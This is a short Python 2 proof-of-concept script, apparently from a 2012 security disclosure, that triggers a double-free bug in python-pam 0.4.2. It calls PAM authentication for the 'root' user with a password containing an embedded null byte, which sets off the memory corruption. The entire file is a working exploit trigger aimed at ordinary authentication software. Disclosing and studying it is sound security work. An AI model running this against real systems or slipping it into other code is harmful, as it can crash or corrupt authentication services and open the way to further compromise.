#!/usr/bin/env python
##
## python-pam 0.4.2 double free PoC
##
## 2012 Leading Security Experts GmbH
## Markus Vervier
##
# -*- coding: utf-8 -*-

def verify_password(user, password):
    import PAM
    def pam_conv(auth, query_list, userData):
        resp = []
        resp.append( (password, 0))
        return resp
    res = -3
    service = 'passwd'

    auth = PAM.pam()
    auth.start(service)
    auth.set_item(PAM.PAM_USER, user)
    auth.set_item(PAM.PAM_CONV, pam_conv)
    try:
        auth.authenticate()
        auth.acct_mgmt()
    except PAM.error, resp:
        print 'Go away! (%s)' % resp
        res = -1
    except:
        print 'Internal error'
        res = -2
    else:
        print 'Good to go!'
        res = 0

    return res

print verify_password("root", "a\x00secret")
